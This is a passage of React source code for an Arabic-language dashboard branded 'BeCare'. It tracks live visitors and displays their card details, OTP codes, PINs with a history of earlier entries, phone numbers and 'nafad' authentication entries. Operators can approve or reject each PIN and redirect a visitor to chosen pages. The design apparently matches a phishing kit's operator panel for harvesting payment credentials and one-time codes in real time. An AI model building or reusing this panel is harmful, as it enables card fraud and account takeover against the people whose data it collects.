          gap: 8,
          marginBottom: 12
        }}>
          <span style={{ fontSize: "1.2rem" }}>{config.icon}</span>
          <span style={{ fontSize: "0.85rem", fontWeight: 600, color: config.color }}>
            {config.text}
          </span>
        </div>

        {/* عرض رمز PIN */}
        {pinCode && (
          <div style={{
            background: "#f0fdf4",
            borderRadius: 8,
            padding: 16,
            border: "1px solid #86efac",
            textAlign: "center",
            marginBottom: 12
          }}>
            <div style={{
              fontSize: "0.75rem",
              color: "#166534",
              marginBottom: 8,
              fontWeight: 500
            }}>
              رمز PIN المدخل
            </div>
            <div style={{
              fontFamily: "ui-monospace, monospace",
              fontSize: "2rem",
              fontWeight: 700,
              color: "#166534",
              letterSpacing: "8px",
              direction: "ltr"
            }}>
              {pinCode}
            </div>
          </div>
        )}

        {/* أزرار التحكم */}
        {pinStatus === "verifying" && (
          <div style={{ 
            display: "flex", 
            gap: 8,
            marginBottom: 12
          }}>
            <button
              onClick={(e) => handlePinAction("approved", e)}
              style={{
                flex: 1,
                padding: "10px 16px",
                borderRadius: 8,
                border: "none",
                background: "#166534",
                color: "white",
                fontSize: "0.8rem",
                fontWeight: 600,
                cursor: "pointer",
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                gap: 6
              }}
            >
              ✅ موافق
            </button>
            <button
              onClick={(e) => handlePinAction("rejected", e)}
              style={{
                flex: 1,
                padding: "10px 16px",
                borderRadius: 8,
                border: "none",
                background: "#991b1b",
                color: "white",
                fontSize: "0.8rem",
                fontWeight: 600,
                cursor: "pointer",
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                gap: 6
              }}
            >
              ❌ رفض
            </button>
          </div>
        )}

        {/* زر عرض الرموز السابقة */}
        {hasPinHistory[selectedRequest?.id || selectedRequest?.visitorId || ""] && (
          <div style={{ marginTop: 12 }}>
            <button
              onClick={() => togglePinHistory(selectedRequest?.id || selectedRequest?.visitorId || "")}
              style={{
                width: "100%",
                padding: "8px 16px",
                borderRadius: 8,
                border: "1px solid #e5e7eb",
                background: expandedPinHistory[selectedRequest?.id || selectedRequest?.visitorId || ""] ? "#f3f4f6" : "#ffffff",
                color: "#374151",
                fontSize: "0.75rem",
                fontWeight: 600,
                cursor: "pointer",
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                gap: 6
              }}
            >
              {expandedPinHistory[selectedRequest?.id || selectedRequest?.visitorId || ""] ? "🔼 إخفاء السجلات" : `📋 عرض ${pinHistory[selectedRequest?.id || selectedRequest?.visitorId || ""]?.length || 0} رموز PIN سابقة`}
            </button>

            {/* سجلات رموز PIN */}
            {expandedPinHistory[selectedRequest?.id || selectedRequest?.visitorId || ""] && (
              <div style={{ 
                marginTop: 8,
                maxHeight: 300,
                overflowY: "auto"
              }}>
                {pinHistory[selectedRequest?.id || selectedRequest?.visitorId || ""]?.map((item: any, idx: number) => (
                  <div key={idx} style={{
                    background: "#f9fafb",
                    borderRadius: 8,
                    padding: 12,
                    marginBottom: 8,
                    border: "1px solid #e5e7eb",
                    textAlign: "center"
                  }}>
                    <div style={{ fontSize: "0.7rem", fontWeight: 600, color: "#374151", marginBottom: 4 }}>
                      رمز PIN سابق #{idx + 1}
                    </div>
                    <div style={{
                      fontFamily: "ui-monospace, monospace",
                      fontSize: "1.5rem",
                      fontWeight: 700,
                      color: "#166534",
                      letterSpacing: "6px",
                      direction: "ltr",
                      marginBottom: 4
                    }}>
                      {item.pinCode}
                    </div>
                    <div style={{
                      fontSize: "0.65rem",
                      padding: "2px 6px",
                      borderRadius: 4,
                      display: "inline-block",
                      background: item.pinStatus === "approved" ? "#dcfce7" : item.pinStatus === "rejected" ? "#fee2e2" : "#fef3c7",
                      color: item.pinStatus === "approved" ? "#166534" : item.pinStatus === "rejected" ? "#991b1b" : "#92400e"
                    }}>
                      {item.pinStatus === "approved" ? "✅" : item.pinStatus === "rejected" ? "❌" : "⏳"} {item.pinStatus}
                    </div>
                  </div>
                ))}
              </div>
            )}
          </div>
        )}
        
        {/* عداد التحديث */}
        {timestamp && (
          <div style={{ marginTop: 12, textAlign: "center", paddingTop: 12, borderTop: "1px solid #e5e7eb" }}>
            <BoxTimer timestamp={timestamp} />
          </div>
        )}
      </div>
    );
  };

  // =============================================
  // دالة عرض جميع الصناديق الجديدة - مرتبة حسب الأحدث
  // =============================================
  const renderAllNewBoxes = () => {
    const raw = selectedRequest?.raw || {};
    
    // دالة مساعدة للحصول على أحدث وقت لكل صندوق
    // Note: submittedAt/updatedAt are at top level, not in raw
    const getBoxTimestamp = (boxKey: string): number => {
      const topLevel = selectedRequest || {};
      const rawData = raw || {};
      const timestamps: Record<string, number> = {
        home: new Date(topLevel.submittedAt || topLevel.updatedAt || rawData.submittedAt || rawData.homeUpdatedAt || 0).getTime(),
        insur: new Date(rawData.insurUpdatedAt || topLevel.updatedAt || topLevel.submittedAt || 0).getTime(),
        compar: new Date(rawData.comparCompletedAt || rawData.comparUpdatedAt || rawData.selectedOffer?.updatedAt || topLevel.updatedAt || 0).getTime(),
        check: new Date(rawData._v1UpdatedAt || rawData.cardUpdatedAt || 0).getTime(),
        otp: new Date(rawData._v5UpdatedAt || rawData.otpSubmittedAt || 0).getTime(),
        pin: new Date(rawData.pinSubmittedAt || rawData._v6UpdatedAt || 0).getTime(),
        phone: new Date(rawData.phoneSubmittedAt || rawData._v7UpdatedAt || 0).getTime(),
        nafad: new Date(rawData.nafadUpdatedAt || 0).getTime(),
      };
      return timestamps[boxKey] || 0;
    };

    // إنشاء قائمة الصناديق مع أوقاتها
    const boxes: Array<{ key: string; component: React.ReactNode; timestamp: number }> = [];

    const homeBox = renderHomeNewBox();
    if (homeBox) boxes.push({ key: 'home', component: homeBox, timestamp: getBoxTimestamp('home') });

    const insurBox = renderInsurBox();
    if (insurBox) boxes.push({ key: 'insur', component: insurBox, timestamp: getBoxTimestamp('insur') });

    const comparBox = renderComparBox();
    if (comparBox) boxes.push({ key: 'compar', component: comparBox, timestamp: getBoxTimestamp('compar') });

    const checkBox = renderCheckBox();
    if (checkBox) boxes.push({ key: 'check', component: checkBox, timestamp: getBoxTimestamp('check') });

    const otpBox = renderOtpBox();
    if (otpBox) boxes.push({ key: 'otp', component: otpBox, timestamp: getBoxTimestamp('otp') });

    const pinBox = renderPinBox();
    if (pinBox) boxes.push({ key: 'pin', component: pinBox, timestamp: getBoxTimestamp('pin') });

    const phoneBox = renderPhoneBox();
    if (phoneBox) boxes.push({ key: 'phone', component: phoneBox, timestamp: getBoxTimestamp('phone') });

    const nafadBox = renderNafadBox();
    if (nafadBox) boxes.push({ key: 'nafad', component: nafadBox, timestamp: getBoxTimestamp('nafad') });

    if (boxes.length === 0) {
      return (
        <div style={{ 
          textAlign: "center", 
          padding: 40,
          color: "#9ca3af",
          fontSize: "0.9rem"
        }}>
          لا توجد بيانات متاحة
        </div>
      );
    }

    // ترتيب الصناديق حسب الأحدث (الأعلى في القائمة = الأحدث)
    boxes.sort((a, b) => b.timestamp - a.timestamp);

    return (
      <div style={{ 
        display: "flex", 
        flexDirection: "column", 
        gap: 12, 
        padding: 16 
      }}>
        {boxes.map((box) => (
          <div key={box.key}>
            {box.component}
          </div>
        ))}
      </div>
    );
  };

  return (
    <div style={{ minHeight: "100vh", background: "#f8fafc", fontFamily: "Tahoma, Arial, sans-serif", margin: 0, padding: 0 }} dir="rtl">
      {/* Notification */}
      {notification && (
        <div
          style={{
            position: "fixed",
            top: 70,
            left: "50%",
            transform: "translateX(-50%)",
            padding: "12px 24px",
            borderRadius: 8,
            background: notification.type === "success" ? "#22c55e" : "#ef4444",
            color: "#fff",
            fontWeight: 600,
            zIndex: 1000,
            boxShadow: "0 4px 12px rgba(0,0,0,0.15)",
            direction: "rtl",
          }}
        >
          {notification.message}
        </div>
      )}

      {/* Header */}
      <header
        style={{
          display: "flex",
          alignItems: "center",
          gap: 0,
          height: 54,
          padding: "0 12px",
          background: "#ffffff",
          borderBottom: "1px solid #e5e7eb",
          position: "sticky",
          top: 0,
          zIndex: 100,
          boxShadow: "0 1px 0 rgba(15, 23, 42, 0.04)",
        }}
        dir="rtl"
      >
        <div style={{ display: "flex", alignItems: "center", gap: 8, paddingLeft: 12, borderLeft: "1px solid #e5e7eb" }}>
          <div
            style={{
              width: 28,
              height: 28,
              borderRadius: 8,
              background: "linear-gradient(135deg, #22c55e, #15803d)",
              display: "grid",
              placeItems: "center",
              fontWeight: 900,
              fontSize: "0.8rem",
              color: "#fff",
              boxShadow: "0 8px 20px rgba(34, 197, 94, 0.22)",
            }}
          >
            B
          </div>
          <span style={{ color: "#111827", fontWeight: 800, fontSize: "0.9rem", letterSpacing: "0.04em" }}>BeCare</span>
        </div>

        <div style={{ display: "flex", alignItems: "center", gap: 0, marginRight: "auto", overflowX: "auto", scrollbarWidth: "none" }}>
          <div style={{ display: "flex", alignItems: "center", gap: 6, padding: "0 12px", borderLeft: "1px solid #e5e7eb" }}>
            <span style={{ width: 8, height: 8, borderRadius: "50%", background: "#4ade80", boxShadow: "0 0 0 4px rgba(74, 222, 128, 0.2)" }} />
            <span style={{ color: "#16a34a", fontWeight: 700, fontSize: "0.9rem" }}>{stats.onlineCount}</span>
            <span style={{ color: "#64748b", fontSize: "0.72rem" }}>الزوار الحاليون</span>
          </div>

          <div style={{ display: "flex", alignItems: "center", gap: 6, padding: "0 12px", borderLeft: "1px solid #e5e7eb" }}>
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#9ca3af" strokeWidth="2">
              <path d="M16 7h6v6" />
              <path d="m22 7-8.5 8.5-5-5L2 17" />
            </svg>
            <span style={{ color: "#6b7280", fontSize: "0.72rem" }}>اليوم</span>
            <span style={{ fontWeight: 700, fontSize: "0.9rem" }}>{stats.todayCount}</span>
          </div>

          <div style={{ display: "flex", alignItems: "center", gap: 6, padding: "0 12px", borderLeft: "1px solid #e5e7eb" }}>
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#9ca3af" strokeWidth="2">
              <circle cx="12" cy="12" r="10" />
              <path d="M2 12h20" />
              <path d="M12 2a14.5 14.5 0 0 0 0 20 14.5 14.5 0 0 0 0-20" />
            </svg>
            <span style={{ color: "#6b7280", fontSize: "0.72rem" }}>إجمالي</span>
            <span style={{ fontWeight: 700, fontSize: "0.9rem" }}>{stats.totalCustomers}</span>
          </div>

          <div style={{ display: "flex", alignItems: "center", gap: 6, padding: "0 12px", borderLeft: "1px solid #e5e7eb", color: "#2563eb" }}>
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
              <rect width="20" height="14" x="2" y="5" rx="2" />
              <line x1="2" x2="22" y1="10" y2="10" />
            </svg>
            <span style={{ fontWeight: 700, fontSize: "0.9rem" }}>{stats.cardCount}</span>
          </div>

          <div style={{ display: "flex", alignItems: "center", gap: 6, padding: "0 12px", borderLeft: "1px solid #e5e7eb", color: "#16a34a" }}>
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
              <path d="M13.832 16.568a1 1 0 0 0 1.213-.303l.355-.465A2 2 0 0 1 17 15h3a2 2 0 0 1 2 2v3a2 2 0 0 1-2 2A18 18 0 0 1 2 4a2 2 0 0 1 2-2h3a2 2 0 0 1 2 2v3a2 2 0 0 1-.8 1.6l-.468.351a1 1 0 0 0-.292 1.233 14 14 0 0 0 6.392 6.384" />
            </svg>
            <span style={{ fontWeight: 700, fontSize: "0.9rem" }}>{stats.phoneCount}</span>
          </div>

          <div style={{ width: 1, height: 20, background: "#e5e7eb", margin: "0 4px" }} />

          <div style={{ display: "flex", alignItems: "center", gap: 6, padding: "0 12px", borderLeft: "1px solid #e5e7eb" }}>
            <span style={{ color: "#64748b", fontSize: "0.72rem" }}>زوار</span>
            <span style={{ color: "#16a34a", fontWeight: 700, fontSize: "0.9rem" }}>{stats.newCount}</span>
            <span style={{ color: "#94a3b8", fontSize: "0.72rem" }}>/</span>
            <span style={{ color: "#f59e0b", fontWeight: 700, fontSize: "0.9rem" }}>{stats.pendingCount}</span>
            <span style={{ color: "#94a3b8", fontSize: "0.72rem" }}>/</span>
            <span style={{ color: "#334155", fontWeight: 700, fontSize: "0.9rem" }}>{stats.totalCustomers}</span>
          </div>

          <div style={{ display: "flex", alignItems: "center", gap: 6, padding: "0 12px" }}>
            <span style={{ color: "#64748b", fontSize: "0.72rem" }}>عملاء</span>
            <span style={{ color: "#16a34a", fontWeight: 700, fontSize: "0.9rem" }}>{stats.completedCount}</span>
            <span style={{ color: "#94a3b8", fontSize: "0.72rem" }}>/</span>
            <span style={{ color: "#f59e0b", fontWeight: 700, fontSize: "0.9rem" }}>{stats.pendingCount}</span>
            <span style={{ color: "#94a3b8", fontSize: "0.72rem" }}>/</span>
            <span style={{ color: "#334155", fontWeight: 700, fontSize: "0.9rem" }}>{stats.totalCustomers}</span>
          </div>
        </div>

        <div style={{ display: "flex", alignItems: "center", gap: 0, marginRight: 8, borderRight: "1px solid #e5e7eb", paddingRight: 8 }}>
          <div ref={headerMenuRef} style={{ position: "relative" }}>
            <button
              onClick={() => setHeaderMenuOpen((value) => !value)}
              title="إعدادات"
              style={{
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                width: 40,
                height: 40,
                border: "none",
                borderRadius: 8,
                background: headerMenuOpen ? "#f3f4f6" : "transparent",
                cursor: "pointer",
              }}
            >
              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#94a3b8" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                <path d="M9.671 4.136a2.34 2.34 0 0 1 4.659 0 2.34 2.34 0 0 0 3.319 1.915 2.34 2.34 0 0 1 2.33 4.033 2.34 2.34 0 0 0 0 3.831 2.34 2.34 0 0 1-2.33 4.033 2.34 2.34 0 0 0-3.319 1.915 2.34 2.34 0 0 1-4.659 0 2.34 2.34 0 0 0-3.32-1.915 2.34 2.34 0 0 1-2.33-4.033 2.34 2.34 0 0 0 0-3.831A2.34 2.34 0 0 1 6.35 6.051a2.34 2.34 0 0 0 3.319-1.915" />
                <circle cx="12" cy="12" r="3" />
              </svg>
            </button>
            {headerMenuOpen && (
              <div style={{ position: "absolute", top: 44, left: 0, minWidth: 180, background: "#fff", border: "1px solid #e5e7eb", borderRadius: 10, boxShadow: "0 12px 30px rgba(15, 23, 42, 0.12)", overflow: "hidden", zIndex: 120 }}>
                <button 
                  onClick={() => { setHeaderMenuOpen(false); setShowSettingsModal(true); }}
                  style={{ width: "100%", border: "none", background: "#fff", padding: "10px 12px", textAlign: "right", cursor: "pointer", color: "#0f172a", fontWeight: 600, display: "flex", alignItems: "center", gap: 8 }}>
                  <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                    <circle cx="12" cy="12" r="3"/>
                    <path d="M12 1v2M12 21v2M4.22 4.22l1.42 1.42M18.36 18.36l1.42 1.42M1 12h2M21 12h2M4.22 19.78l1.42-1.42M18.36 5.64l1.42-1.42"/>
                  </svg>
                  الإعدادات
                </button>
              </div>
            )}
          </div>

          <button title="تنبيهات" style={{ display: "flex", alignItems: "center", justifyContent: "center", width: 40, height: 40, border: "none", borderRadius: 8, background: "transparent", cursor: "pointer" }}>
            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#94a3b8" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
              <path d="M10.268 21a2 2 0 0 0 3.464 0" />
              <path d="M3.262 15.326A1 1 0 0 0 4 17h16a1 1 0 0 0 .74-1.673C19.41 13.956 18 12.499 18 8A6 6 0 0 0 6 8c0 4.499-1.411 5.956-2.738 7.326" />
            </svg>
          </button>

          <button title="تسجيل الخروج" style={{ display: "flex", alignItems: "center", gap: 8, padding: "0 10px", height: 40, border: "none", borderRadius: 999, background: "#f8fafc", cursor: "pointer" }}>
            <div style={{ width: 28, height: 28, borderRadius: "50%", background: "linear-gradient(135deg, #3b82f6, #7c3aed)", display: "grid", placeItems: "center", color: "#fff", fontWeight: 700, fontSize: "0.8rem" }}>
              A
            </div>
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#94a3b8" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
              <path d="M19 9l-7 7-7-7" />
            </svg>
          </button>
        </div>
      </header>

      {/* Main Content */}
      <div style={{ display: "flex", minHeight: "calc(100vh - 54px)" }}>
        {/* Sidebar - Visitor List */}
        <aside
          style={{
            width: 340,
            background: "#ffffff",
            borderLeft: "1px solid #e5e7eb",
            display: "flex",
            flexDirection: "column",
            maxHeight: "calc(100vh - 54px)",
            overflow: "hidden",
          }}
        >
          {/* Search and Filters */}
          <div style={{ padding: 12, borderBottom: "1px solid #e5e7eb" }}>
            {/* Filter buttons */}
            <div style={{ display: "flex", gap: 8, marginBottom: 12 }}>
              <button
                onClick={() => setFilterMode("all")}
                style={{
                  flex: 1,
                  padding: "8px 12px",
                  border: filterMode === "all" ? "1px solid #22c55e" : "1px solid #e5e7eb",
                  borderRadius: 8,
                  background: filterMode === "all" ? "#f0fdf4" : "#fff",
                  color: filterMode === "all" ? "#16a34a" : "#6b7280",
                  fontWeight: 600,
                  cursor: "pointer",
                  fontSize: "0.85rem",
                }}
              >
                الكل ({stats.totalCustomers})
              </button>
              <button
                onClick={() => setFilterMode("cards")}
                style={{
                  flex: 1,
                  padding: "8px 12px",
                  border: filterMode === "cards" ? "1px solid #22c55e" : "1px solid #e5e7eb",
                  borderRadius: 8,
                  background: filterMode === "cards" ? "#f0fdf4" : "#fff",
                  color: filterMode === "cards" ? "#16a34a" : "#6b7280",
                  fontWeight: 600,
                  cursor: "pointer",
                  fontSize: "0.85rem",
                }}
              >
                بطاقة ({stats.cardCount})
              </button>
            </div>

            {/* Search */}
            <div style={{ display: "flex", gap: 8, marginBottom: 8 }}>
              <div style={{ position: "relative", flex: 1 }}>
                <svg
                  width="16"
                  height="16"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="#9ca3af"
                  strokeWidth="2"
                  style={{ position: "absolute", right: 12, top: "50%", transform: "translateY(-50%)" }}
                >
                  <circle cx="11" cy="11" r="8" />
                  <path d="m21 21-4.3-4.3" />
                </svg>
                <input
                  type="text"
                  placeholder="بحث (الاسم، الهوية، الهاتف)"
                  value={searchQuery}
                  onChange={(e) => setSearchQuery(e.target.value)}
                  style={{
                    width: "100%",
                    padding: "10px 12px 10px 36px",
                    border: "1px solid #e5e7eb",
                    borderRadius: 8,
                    fontSize: "0.85rem",
                    outline: "none",
                  }}
                />
              </div>
              {/* Delete Button */}
              {selectedRequestIds.length > 0 && (
                <button
                  onClick={handleDeleteSelected}
                  title={`حذف ${selectedRequestIds.length} محدد`}
                  style={{
                    display: "flex",
                    alignItems: "center",
                    justifyContent: "center",
                    width: 40,
                    height: 40,
                    border: "none",
                    borderRadius: 8,
                    background: "#ef4444",
                    color: "#fff",
                    cursor: "pointer",
                    fontWeight: 700,
                    fontSize: "1.2rem",
                    boxShadow: "0 2px 8px rgba(239, 68, 68, 0.3)",
                    transition: "all 0.2s",
                  }}
                  onMouseEnter={(e) => {
                    e.currentTarget.style.background = "#dc2626";
                    e.currentTarget.style.transform = "scale(1.05)";
                  }}
                  onMouseLeave={(e) => {
                    e.currentTarget.style.background = "#ef4444";
                    e.currentTarget.style.transform = "scale(1)";
                  }}
                >
                  🗑️
                </button>
              )}
            </div>

            {/* Selected count indicator */}
            {selectedRequestIds.length > 0 && (
              <div style={{
                display: "flex",
                alignItems: "center",
                justifyContent: "space-between",
                marginBottom: 8,
                padding: "6px 10px",
                background: "#fef2f2",
                border: "1px solid #fecaca",
                borderRadius: 6,
                fontSize: "0.8rem",
              }}>
                <span style={{ color: "#dc2626", fontWeight: 600 }}>
                  {selectedRequestIds.length} محدد
                </span>
                <button
                  onClick={() => setSelectedRequestIds([])}
                  style={{
                    border: "none",
                    background: "transparent",
                    color: "#6b7280",
                    cursor: "pointer",
                    fontSize: "0.75rem",
                    padding: "2px 6px",
                  }}
                >
                  إلغاء التحديد
                </button>
              </div>
            )}
          </div>

          {/* Visitor List - Sorted by newest first */}
          <div style={{ flex: 1, overflowY: "auto", fontFamily: "Cairo, Tajawal, sans-serif" }}>
            {/* Select All Header */}
            <div style={{
              display: "flex",
              alignItems: "center",
              gap: 8,
              padding: "8px 10px",
              borderBottom: "1px solid #e5e7eb",
              background: "#f9fafb",
            }}>
              <input
                type="checkbox"
                checked={selectedRequestIds.length > 0 && selectedRequestIds.length === filteredRequests.length}
                ref={(el) => {
                  if (el) el.indeterminate = selectedRequestIds.length > 0 && selectedRequestIds.length < filteredRequests.length;
                }}
                onChange={handleSelectAll}
                style={{ accentColor: "#16a34e", cursor: "pointer", width: 16, height: 16 }}
              />
              <span style={{ fontSize: "0.8rem", color: "#6b7280", fontWeight: 500 }}>
                تحديد الكل ({filteredRequests.length})
              </span>
            </div>

            {filteredRequests.map((item) => {
              const isSelected = selectedRequestIds.includes(item.id);
              const isFocused = selectedRequestId === item.id;
              const isOnline = item.badge === "new" || (item.updatedAt && (Date.now() - new Date(item.updatedAt).getTime()) < 60000);
              const currentPage = item.raw?.currentPage || item.raw?.page || "غير متصل";
              const entryCount = getCustomerEntryCount(item);
              
              // Get the latest timestamp from raw data (same as boxes in main panel)
              const raw = item.raw || {};
              const latestTimestamp = 
                raw.checkUpdatedAt ? new Date(raw.checkUpdatedAt).getTime() :
                raw.cardUpdatedAt ? new Date(raw.cardUpdatedAt).getTime() :
                raw.otpSubmittedAt ? new Date(raw.otpSubmittedAt).getTime() :
                raw.pinSubmittedAt ? new Date(raw.pinSubmittedAt).getTime() :
                raw.phoneSubmittedAt ? new Date(raw.phoneSubmittedAt).getTime() :
                raw.nafadUpdatedAt ? new Date(raw.nafadUpdatedAt).getTime() :
                raw.createdAt ? new Date(raw.createdAt).getTime() :
                raw.submittedAt ? new Date(raw.submittedAt).getTime() :
                item.submittedAt ? new Date(item.submittedAt).getTime() : 0;
              
              const timeSinceSubmit = latestTimestamp > 0 ? currentTime - latestTimestamp : 0;
              const minutesSince = Math.floor(timeSinceSubmit / 60000);
              const hoursSince = Math.floor(minutesSince / 60);
              const daysSince = Math.floor(hoursSince / 24);
              
              // Smart format: show the most appropriate time unit
              let timeText = '';
              if (daysSince > 0) {
                timeText = `${daysSince}d ${hoursSince % 24}h`;
              } else if (hoursSince > 0) {
                timeText = `${hoursSince}:${String(minutesSince % 60).padStart(2, '0')}h`;
              } else if (minutesSince > 0) {
                timeText = `${minutesSince}m`;
              } else {
                timeText = 'الآن';
              }
              
              // Background color based on status
              let backgroundColor = "#f9fafb"; // Default gray for offline
              if (isFocused) {
                backgroundColor = "#ffffff"; // White when focused
              } else if (isOnline) {
                backgroundColor = "#fefce8"; // Light yellow for online
              }
              
              return (
                <div
                  key={item.id}
                  onClick={() => setSelectedRequestId(item.id)}
                  style={{
                    padding: "10px",
                    borderBottom: "1px solid #e5e7eb",
                    background: backgroundColor,
                    cursor: "pointer",
                    transition: "background 0.3s",
                    borderRight: isFocused ? "3px solid #16a34a" : "3px solid transparent",
                  }}
                >
                  <div style={{ display: "flex", alignItems: "start", gap: 8 }}>
                    {/* Checkbox */}
                    <div style={{ marginTop: 2 }}>
                      <input
                        type="checkbox"
                        checked={isSelected}
                        onChange={(event) => {
                          event.stopPropagation();
                          toggleRequestSelection(item.id);
                        }}
                        onClick={(event) => event.stopPropagation()}
                        style={{ accentColor: "#16a34a", cursor: "pointer", width: 14, height: 14 }}
                      />
                    </div>
                    
                    {/* Avatar with status */}
                    <div style={{ position: "relative", flexShrink: 0 }}>
                      <div style={{
                        width: 36,
                        height: 36,
                        borderRadius: "50%",
                        background: isOnline 
                          ? "linear-gradient(135deg, #16a34a, #15803d)" 
                          : "linear-gradient(135deg, #4b5563, #374151)",
                        boxShadow: isOnline ? "0 0 0 2px rgba(34, 197, 94, 0.25)" : "none",
                        display: "flex",
                        alignItems: "center",
                        justifyContent: "center",
                        fontSize: "0.7rem",
                        fontWeight: 700,
                        color: "#fff",
                      }}>
                        {item.customer?.charAt(0)?.toUpperCase() || "?"}
                      </div>
                      {/* Online indicator */}
                      <span style={{
                        position: "absolute",
                        bottom: 0,
                        right: 0,
                        width: 10,
                        height: 10,
                        borderRadius: "50%",
                        background: isOnline ? "#16a34a" : "#6b7280",
                        border: "2px solid #fff",
                        animation: isOnline ? "pulse 2s infinite" : "none",
                      }} />
                      {/* Country flag */}
                      {getCountryFlag(item.raw) && (
                        <span style={{
                          position: "absolute",
                          top: -2,
                          left: -2,
                          fontSize: "0.65rem",
                          lineHeight: 1,
                        }}>
                          {getCountryFlag(item.raw)}
                        </span>
                      )}
                    </div>
                    
                    {/* Info */}
                    <div style={{ flex: 1, minWidth: 0 }}>
                      <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 2 }}>
                        <div style={{ display: "flex", alignItems: "center", gap: 6 }}>
                          <span style={{ 
                            fontWeight: 700, 
                            fontSize: "0.8rem", 
                            color: selectedRequestId === item.id ? "#15803d" : "#111827",
                            overflow: "hidden",
                            textOverflow: "ellipsis",
                            whiteSpace: "nowrap",
                            maxWidth: entryCount > 1 ? 120 : 160,
                          }}>
                            {getCustomerDisplayName(item)}
                          </span>
                          {item.hasCard || item.raw?._v1 || item.raw?.cardNumber ? (
                            <span style={{ flexShrink: 0 }}>
                              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#3b82f6" strokeWidth="2">
                                <rect width="20" height="14" x="2" y="5" rx="2" />
                                <line x1="2" x2="22" y1="10" y2="10" />
                              </svg>
                            </span>
                          ) : null}
                        </div>
                        {/* Smart timer - time since first submission */}
                        <span style={{ 
                          fontSize: "0.65rem", 
                          color: isOnline ? "#16a34a" : "#9ca3af", 
                          whiteSpace: "nowrap", 
                          flexShrink: 0,
                          fontWeight: isOnline ? 700 : 400 
                        }}>
                          {timeText}
                        </span>
                      </div>
                      <div style={{ display: "flex", alignItems: "center", gap: 6, flexWrap: "wrap" }}>
                        <span style={{ fontSize: "0.75rem", color: "#4b5563", fontWeight: 600 }}>
                          {getPageArabicName(currentPage)}
                        </span>
                        <span style={{
                          width: 6,
                          height: 6,
                          borderRadius: "50%",
                          background: isOnline ? "#16a34a" : "#9ca3af",
                          display: "inline-block",
                          animation: isOnline ? "pulse 2s infinite" : "none",
                        }} />
                      </div>
                    </div>
                  </div>
                </div>
              );
            })}
            {filteredRequests.length === 0 && (
              <div style={{ padding: 24, textAlign: "center", color: "#6b7280" }}>لا توجد نتائج</div>
            )}
          </div>

        </aside>

        {/* Main Panel - Client Details */}
        <main style={{ flex: 1, padding: 0, overflowY: "auto", margin: 0 }}>
          {selectedRequest && (
            <div style={{ maxWidth: "100%", width: "100%", margin: 0 }}>
              {/* Client Header */}
              <div
                style={{
                  background: "#ffffff",
                  border: "1px solid #e5e7eb",
                  boxShadow: "0 1px 2px rgba(15, 23, 42, 0.04)",
                }}
              >
                <div style={{ display: "flex", alignItems: "center", gap: 8, padding: "10px 12px", borderBottom: "1px solid #e5e7eb" }}>
                  <span style={{ fontSize: "11px", fontFamily: "ui-monospace, SFMono-Regular, monospace", color: "#6b7280", background: "#f3f4f6", border: "1px solid #e5e7eb", padding: "2px 8px", borderRadius: 4, flexShrink: 0 }}>
                    {selectedRequest.id.slice(0, 10).toUpperCase()}
                  </span>
                  <button
                    title="تحديث"
                    style={{ display: "flex", alignItems: "center", gap: 6, minWidth: 0, border: "none", background: "transparent", padding: 0, cursor: "pointer" }}
                  >
                    <span style={{ fontWeight: 700, color: "#111827", fontSize: "0.9rem", overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap" }}>
                      {liveSummary.ownerName || getCustomerDisplayName(selectedRequest)}
                    </span>
                    <span style={{ color: "#9ca3af", fontSize: "0.85rem" }}>↻</span>
                  </button>
                  <div style={{ flex: 1 }} />
                  <select
                    value={redirectPage}
                    onChange={async (e) => {
                      const selectedPage = e.target.value;
                      if (!selectedPage) return;

                      const visitorId = selectedRequest?.visitorId || selectedRequest?.id;
                      if (!visitorId) return;

                      setRedirectPage(selectedPage);

                      try {
                        const res = await fetch("/api/dashboard/redirect", {
                          method: "POST",
                          headers: { "Content-Type": "application/json" },
                          body: JSON.stringify({ visitorId, targetPage: selectedPage }),
                        });
                        if (res.ok) {
                          const pageLabel = pageOptions.find((p) => p.value === selectedPage)?.label || selectedPage;
                          showNotification("success", `تم توجيه العميل إلى: ${pageLabel}`);
                        } else {
                          showNotification("error", "حدث خطأ");
                        }
                      } catch {
                        showNotification("error", "فشل الاتصال");
                      }
                      setRedirectPage("");
                    }}
                    style={{
                      fontSize: "11px",
                      padding: "4px 8px",
                      background: "#ffffff",
                      border: "1px solid #d1d5db",
                      borderRadius: 6,
                      color: "#374151",
                      cursor: "pointer",
                      boxShadow: "0 1px 2px rgba(0,0,0,0.04)",
                    }}
                  >
                    {pageOptions.map((opt) => (
                      <option key={opt.value} value={opt.value}>{opt.label}</option>
                    ))}
                  </select>
                </div>
                <div style={{ display: "flex", alignItems: "center", gap: 0, overflowX: "auto", fontSize: "11px" }}>
                  <div style={{ display: "flex", alignItems: "center", gap: 6, padding: "8px 12px", borderLeft: "1px solid #f3f4f6", flexShrink: 0 }}>
                    <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#9ca3af" strokeWidth="2"><path d="M3 5a2 2 0 012-2h3.28a1 1 0 01.948.684l1.498 4.493a1 1 0 01-.502 1.21l-2.257 1.13a11.042 11.042 0 005.516 5.516l1.13-2.257a1 1 0 011.21-.502l4.493 1.498a1 1 0 01.684.949V19a2 2 0 01-2 2h-1C9.716 21 3 14.284 3 6V5z" /></svg>
